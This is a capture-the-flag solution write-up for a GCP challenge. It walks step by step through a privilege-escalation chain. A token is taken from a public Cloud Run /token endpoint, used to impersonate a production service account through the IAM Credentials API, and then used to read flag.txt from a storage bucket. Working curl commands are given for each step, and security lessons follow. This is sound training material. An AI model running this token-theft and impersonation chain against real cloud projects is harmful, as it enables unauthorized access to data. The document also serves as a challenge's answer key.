Follow the Identity

Published on March 2026

Solution

This document outlines the intended solution path for the Apex Infrastructure challenge.

Overview of the Exploit Chain

The full attack flow is:

  1. Review Terraform infrastructure code from the Github repo.
  2. Identify GCP service accounts relationships, cloud storage bucket and a public Cloud Run service.
  3. Discover the /token endpoint for that cloud run service.
  4. Use that endpoint to obtain an access token for automation-sa
  5. Use that token to impersonate prod-sa
  6. Use the prod-sa token to access a storage bucket
  7. Retrieve flag.txt

Step 1 – Review the Infrastructure Repository

Clone and inspect the Terraform configuration:

git clone <repo-url>
cd Apex-Infrastructure

Carefully review the Terraform files.

Key Observations

cloud_run.tf

  • A Cloud Run service is deployed.
  • IAM binding grants roles/run.invoker to allUsers.
  • The service runs as: automation-sa

This means: The Cloud Run service is publicly accessible and executes with the permissions of automation-sa.

iam.tf

Two service accounts are defined:

  • automation-sa
  • prod-sa

There is a critical IAM binding: - automation-sa → roles/iam.serviceAccountTokenCreator → prod-sa

This means: automation-sa is allowed to impersonate prod-sa.

storage.tf

A storage bucket exists:

  • apex-infra-config-files

IAM binding grants: - prod-sa → roles/storage.objectViewer

This means: prod-sa can read objects in the bucket (including flag.txt).

Step 2 – Identify the Entry Point

The public Cloud Run URL is found in a commit in the Apex-Infrastructure repo.

Since the Cloud Run service is public, it can be accessed directly.

The challenge exposes an endpoint: /token This is found through the README.md of the Apex-Infrastructure repo.

This endpoint returns an OAuth access token belonging to: automation-sa

Step 3 – Obtain automation-sa Access Token

Set your Cloud Run URL: - CLOUD_RUN_URL=<cloud-run-url>

Request a token:

AUTOMATION_TOKEN=$(curl -s $CLOUD_RUN_URL/token | jq -r .access_token)
echo $AUTOMATION_TOKEN

You now possess an access token for: automation-sa

Step 4 – Impersonate prod-sa

Because automation-sa has the role: roles/iam.serviceAccountTokenCreator on prod-sa, we can call the IAM Credentials API to generate a new access token.

Run:

PROD_TOKEN=$(curl -s \
  -X POST \
  -H "Authorization: Bearer $AUTOMATION_TOKEN" \
  -H "Content-Type: application/json" \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/prod-sa@development-spring-2026.iam.gserviceaccount.com:generateAccessToken" \
  -d '{
        "scope": ["https://www.googleapis.com/auth/cloud-platform"]
      }' | jq -r .accessToken)

echo $PROD_TOKEN

You now have an access token for: prod-sa

Step 5 – List Bucket Contents

Use the prod-sa token to list objects in the bucket:

curl -H "Authorization: Bearer $PROD_TOKEN" "https://storage.googleapis.com/storage/v1/b/apex-infra-config-files/o"

You should see: flag.txt

Step 6 – Retrieve the Flag

Download the flag:

curl -H "Authorization: Bearer $PROD_TOKEN" "https://storage.googleapis.com/storage/v1/b/apex-infra-config-files/o/flag.txt?alt=media"

The response will contain the flag.

Why This Works

The vulnerability chain is:

  1. Public Cloud Run service running as a privileged service account
  2. /token endpoint exposes an OAuth token
  3. automation-sa can impersonate prod-sa
  4. prod-sa has storage viewer access
  5. The bucket contains sensitive data

This creates a privilege escalation path via service account impersonation.

Security Lessons

  • Never expose raw service account tokens.
  • Avoid granting roles/iam.serviceAccountTokenCreator unless absolutely necessary.
  • Publicly accessible services running as privileged accounts create risk.
  • Always audit IAM impersonation chains.
  • Principle of least privilege must be enforced across service accounts.

Final Exploit Summary

Public Cloud Run → /token endpoint → automation-sa token → impersonate prod-sa → access bucket → retrieve flag
